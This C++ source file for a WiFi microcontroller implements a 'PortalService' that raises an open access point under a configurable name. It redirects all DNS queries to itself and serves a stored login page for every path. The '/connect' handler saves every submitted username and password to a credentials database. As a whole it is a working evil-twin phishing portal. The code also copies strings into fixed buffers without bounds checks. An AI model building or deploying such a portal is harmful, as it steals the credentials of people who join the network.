#include "PortalService.h"

#include <string.h>

PortalService::PortalService(char *portalFolder, CredentialsDatabase *database) : m_server(80), m_dns(), m_database(database)
{
    strcpy(m_folderPath, "/p/");
    strcat(m_folderPath, portalFolder);
    strcat(m_folderPath, "/");

    char configFile[32];
    strcpy(configFile, m_folderPath);
    strcat(configFile, "c.txt");

    strcpy(m_indexPath, m_folderPath);
    strcat(m_indexPath, "index.html");
    
    char *configFileContents;

    readSpiffsFile(configFile, &configFileContents);
    trim(configFileContents);

    strcpy(m_ssid, configFileContents);

    free(configFileContents);
}

bool PortalService::init() 
{
    if (!WiFi.softAP(m_ssid)) {
        Serial.println("Failed creating softAP...");
        return false;
    }

    Serial.printf("\nCreated AP \"%s\"\n", m_ssid);

    m_dns.start(53, "*", IPAddress(192, 168, 4, 1));

    m_server.serveStatic("/", SPIFFS, m_folderPath).setDefaultFile("index.html");

    m_server.on("/connect", [this] (AsyncWebServerRequest *request) {
        if (request->hasParam("username", true) && 
            request->hasParam("password", true)) {
            m_database->add_credentials(request->getParam("username", true)->value(), 
                                        request->getParam("password", true)->value());
            request->redirect("/");
        } else {
            request->send(400, "text/plain", "");
        }
    });

    m_server.onNotFound([this] (AsyncWebServerRequest *request) {
        request->send(SPIFFS, m_indexPath, "text/html");
    });

    m_server.begin();
    return true;
}

void PortalService::update() 
{
    m_dns.processNextRequest();
}